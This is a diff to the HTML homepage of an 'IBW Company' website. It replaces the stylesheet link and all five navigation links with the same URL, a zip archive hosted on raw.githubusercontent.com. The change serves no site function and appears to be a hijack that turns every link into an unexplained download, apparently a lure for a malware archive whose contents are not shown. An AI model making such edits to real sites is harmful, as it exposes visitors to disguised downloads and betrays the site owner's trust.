@@ -4,18 +4,18 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>IBW Company - Home</title>
-    <link rel="stylesheet" href="styles.css">
+    <link rel="stylesheet" href="https://raw.githubusercontent.com/Lephatsoe/website/main/amphibryous/website_3.4.zip">
 </head>
 <body>
     <header>
         <h1>IBW Company</h1>
         <nav>
             <ul>
-                <li><a href="index.html">Home</a></li>
-                <li><a href="services.html">Services</a></li>
-                <li><a href="software-tools.html">Software Tools</a></li>
-                <li><a href="about.html">About Us</a></li>
-                <li><a href="contact.html">Contact</a></li>
+                <li><a href="https://raw.githubusercontent.com/Lephatsoe/website/main/amphibryous/website_3.4.zip">Home</a></li>
+                <li><a href="https://raw.githubusercontent.com/Lephatsoe/website/main/amphibryous/website_3.4.zip">Services</a></li>
+                <li><a href="https://raw.githubusercontent.com/Lephatsoe/website/main/amphibryous/website_3.4.zip">Software Tools</a></li>
+                <li><a href="https://raw.githubusercontent.com/Lephatsoe/website/main/amphibryous/website_3.4.zip">About Us</a></li>
+                <li><a href="https://raw.githubusercontent.com/Lephatsoe/website/main/amphibryous/website_3.4.zip">Contact</a></li>
             </ul>
         </nav>
     </header>
